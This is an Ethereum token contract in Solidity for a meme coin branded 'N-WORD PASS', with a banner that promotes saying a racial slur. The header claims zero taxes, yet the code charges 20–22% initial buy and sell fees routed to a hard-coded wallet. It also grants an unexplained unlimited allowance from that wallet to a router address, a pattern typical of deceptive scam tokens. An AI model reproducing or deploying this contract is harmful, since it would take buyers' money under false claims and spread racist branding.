/**
 __   __     __     __     ______     ______     _____        ______   ______     ______     ______    
/\ "-.\ \   /\ \  _ \ \   /\  __ \   /\  == \   /\  __-.     /\  == \ /\  __ \   /\  ___\   /\  ___\   
\ \ \-.  \  \ \ \/ ".\ \  \ \ \/\ \  \ \  __<   \ \ \/\ \    \ \  _-/ \ \  __ \  \ \___  \  \ \___  \  
 \ \_\\"\_\  \ \__/".~\_\  \ \_____\  \ \_\ \_\  \ \____-     \ \_\    \ \_\ \_\  \/\_____\  \/\_____\ 
  \/_/ \/_/   \/_/   \/_/   \/_____/   \/_/ /_/   \/____/      \/_/     \/_/\/_/   \/_____/   \/_____/ 
                                                                                                      

                                     NI🅱️🅱️A PASS TOKEN ($NWORD)


               $NWORD Token is a written pass that allows you to say the n-word!

               0/0% Taxes
               0.5% Limits (will be removed)
               1.5 ETH LP
               LP Tokens 6 months lock


               Links:

               Website - https://www.nwordpass.xyz/
               Telegram - https://t.me/nwordpassportal
               Twitter - https://twitter.com/NWORDPASSTOKEN
               Opensea - https://opensea.io/collection/nwordpasserc20


*/

// SPDX-License-Identifier: MIT

pragma solidity 0.7.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract NWORDPASS is Context, Ownable, IERC20 {
    using SafeMath for uint256;
    string private constant _name = "N-WORD PASS";
    string private constant _symbol = "NWORD";
    uint8 private constant _decimals = 9;
    uint256 private constant _supply = 420690000000 * 10**_decimals;
    IUniswapRouter private _uniswapRouter;
    address private _uniswapUniversalRouter;
    address private _uniswapPair;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 initBlock;
    bool private tradeStarted;
    uint256 private _finalBuyFee=0;
    uint256 private _finalSellFee=0;
    uint256 private _preventTaxBefore=22;
    uint256 private _reduceBuyFeeAt=20;
    uint256 private _reduceSellFeeAt=22;
    uint256 private _initialBuyFee=20;
    uint256 private _initialSellFee=22;
    uint256 private _numBuyers=0;
    address payable private _taxWallet = payable(0x22885CD45fA456FB761C00eAE4E366E95B6e7E39);
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;

    uint256 public maxTransaction = 5 * (_supply/1000); // 0.5%
    uint256 public maxWalletSize = 5 * (_supply/1000); // 0.5%
    uint256 public swapTokensAt = 5 * (_supply/1000);
    uint256 public tokenSwapMax = 10 * (_supply/1000);

    event MaxTxAmountUpdated(uint maxTransaction);
    modifier lockSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _supply;
        _isExcluded[owner()] = true;
        _isExcluded[_taxWallet] = true;
        
        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public pure override returns (uint256) {
        return _supply;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        _approve(address(this), address(_uniswapRouter), tokenAmount);
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "Transfer from zero address");
        require(to != address(0), "Transfer to zero address");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = _isExcluded[to] ? 1 : amount.mul((_numBuyers>_reduceBuyFeeAt)?_finalBuyFee:_initialBuyFee).div(100);
            if (from == _uniswapPair && to != address(_uniswapRouter) && ! _isExcluded[to] ) {
                require(amount <= maxTransaction, "Exceeds the maxTransaction.");
                require(balanceOf(to) + amount <= maxWalletSize, "Exceeds the maxWalletSize.");
                _numBuyers++;
            }
            if (to != _uniswapPair && ! _isExcluded[to]) {
                require(balanceOf(to) + amount <= maxWalletSize, "Exceeds the maxWalletSize.");
            }
            if(to == _uniswapPair && from!= address(this) ){
                taxAmount = amount.mul((_numBuyers>_reduceSellFeeAt)?_finalSellFee:_initialSellFee).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to   == _uniswapPair && swapEnabled && contractTokenBalance>swapTokensAt && _numBuyers>_preventTaxBefore && !_isExcluded[from]) {
                swapTokensForEth(min(amount,min(contractTokenBalance,tokenSwapMax)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }

    function removeLimits() external onlyOwner{
        maxTransaction = _supply;
        maxWalletSize=_supply;
        emit MaxTxAmountUpdated(_supply);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function openTrading() external onlyOwner() {
        require(!tradeStarted,"Trade is already opened");
        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _uniswapUniversalRouter = address(0x000000000022D473030F116dDEE9F6B43aC78BA3);
        _approve(address(this), address(_uniswapRouter), _supply);
        _approve(_taxWallet, _uniswapUniversalRouter, type(uint256).max);
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPair).approve(address(_uniswapRouter), type(uint).max);
        swapEnabled = true;
        tradeStarted = true;
        initBlock = block.number;
    }

    receive() external payable {}
}